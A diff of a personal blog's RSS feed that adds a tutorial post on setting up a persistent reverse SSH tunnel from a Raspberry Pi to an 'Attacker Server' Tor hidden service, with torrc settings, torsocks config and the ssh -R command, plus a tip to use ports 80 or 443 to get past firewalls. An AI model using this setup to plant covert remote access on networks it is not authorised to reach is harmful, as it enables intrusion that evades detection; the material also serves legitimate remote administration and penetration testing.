@@ -5,9 +5,110 @@
     <description>My Personal Blog</description>
     <link>https://bestrocker221.github.io//</link>
     <atom:link href="https://bestrocker221.github.io//feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 03 May 2018 00:15:39 +0200</pubDate>
-    <lastBuildDate>Thu, 03 May 2018 00:15:39 +0200</lastBuildDate>
+    <pubDate>Thu, 10 May 2018 18:18:53 +0200</pubDate>
+    <lastBuildDate>Thu, 10 May 2018 18:18:53 +0200</lastBuildDate>
     <generator>Jekyll v3.4.3</generator>
+    
+      <item>
+        <title>SSH Reverse Tunnel - Raspberry Pi</title>
+        <description>&lt;h1 id=&quot;persistent-reverse-ssh-tunnel&quot;&gt;Persistent Reverse-SSH Tunnel&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/ssh-tunnel.png&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites:&lt;/h2&gt;
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;user &lt;em&gt;pi&lt;/em&gt; on the Raspberry.&lt;/li&gt;
+  &lt;li&gt;user &lt;em&gt;lobs&lt;/em&gt; on the Attacker Server.&lt;/li&gt;
+  &lt;li&gt;SSH server running on both.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;TOR&lt;/strong&gt; server running on both.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;torsocks&lt;/strong&gt; installed on raspi.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Torsocks allows you to use most applications in a safe way with Tor. It ensures that DNS requests are handled safely and explicitly rejects any traffic other than TCP from the application you’re using.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;tor-hidden-service-setup&quot;&gt;TOR Hidden Service setup&lt;/h1&gt;
+&lt;p&gt;On the attacker machine it is needed to setup a Hidden Service exposing itself to the whole TOR network. The service will expose the local ssh server needed to allow the raspi box to reverse ssh into it.&lt;/p&gt;
+
+&lt;p&gt;Edit the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/tor/torrc&lt;/code&gt; file and modify these lines:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HiddenServiceDir /var/lib/tor/hidden_service/
+HiddenServicePort 30022 127.0.0.1:22
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;where 30022 is the port open to the TOR network redirecting traffic to 127.0.0.1 port 22.&lt;/p&gt;
+
+&lt;p&gt;For further client authorization look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;HiddenServiceAuthorizeClient&lt;/code&gt; directive.&lt;/p&gt;
+
+&lt;p&gt;Then save and restart Tor. It will create the material needed to the hidden service in the &lt;code class=&quot;highlighter-rouge&quot;&gt;hidden_service&lt;/code&gt; folder. The last thing you need is the hostname which will refer to the hidden service located under &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/tor/hidden_service/hostname&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;For example: &lt;code class=&quot;highlighter-rouge&quot;&gt;irpqznciwifhpqgd.onion&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Change also the file &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/tor/torsocks.conf&lt;/code&gt; the line:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AllowOutboundLocalhost 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;This is needed to torsocks&lt;/p&gt;
+
+&lt;h1 id=&quot;from-the-raspberry&quot;&gt;From the Raspberry:&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Copy the RSA key to the Server with:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+    &lt;p&gt;If id_rsa.pub doesn’t already exists then:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh-keygen
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;The command to launch is:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ torsocks ssh -p 30022 -N -R 2222:localhost:22 pi@irpqznciwifhpqgd.onion
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This will use torsocks to ssh the Raspberry to the Attacker Hidden Service without specifying any command (-N) and tell the server to redirect ssh connection from local (server) port 2222 to remote (raspberry) port 22 (or whatever you want).&lt;/p&gt;
+
+&lt;p&gt;After that, on the Attacker Server there will be a ssh socket listening on port 2222 ready to redirect ssh traffic to tor to Raspberry through port 22.&lt;/p&gt;
+
+&lt;p&gt;You can always set up the raspberry to serve ssh connections on port 80 or 443 in order to avoid firewall issues. It depends on the firewall configurations.&lt;/p&gt;
+
+&lt;h1 id=&quot;the-attacker&quot;&gt;The Attacker&lt;/h1&gt;
+
+&lt;p&gt;The attacker just need to:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;SSH into his server on port 30022.&lt;/li&gt;
+  &lt;li&gt;Run the command:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh -p 2222 -l lobs localhost
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The localhost listening service is automatically routing traffic to the TOR network. This means no loss of anonimity for both the client and the server.&lt;/p&gt;
+
+&lt;p&gt;attacker &amp;lt;—&amp;gt; TOR &amp;lt;—&amp;gt; HiddenService &amp;lt;—–&amp;gt; TOR &amp;lt;—-&amp;gt; client&lt;/p&gt;
+
+&lt;h3 id=&quot;considerations&quot;&gt;&lt;strong&gt;Considerations&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;This way if the Raspberry falls under someone’s else hands it has full access on the AttackerServer. If it has served its aim then you should remove the rsa key from the authorized_key on the server or just destroy the HiddenService.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 10 May 2018 00:00:00 +0200</pubDate>
+        <link>https://bestrocker221.github.io//linux/security/2018/05/10/tor-ssh-reverse-tunnel.html</link>
+        <guid isPermaLink="true">https://bestrocker221.github.io//linux/security/2018/05/10/tor-ssh-reverse-tunnel.html</guid>
+        
+        
+        <category>linux</category>
+        
+        <category>security</category>
+        
+      </item>
     
       <item>
         <title>SOCKS PROXY on Reverse SSH tunnel</title>
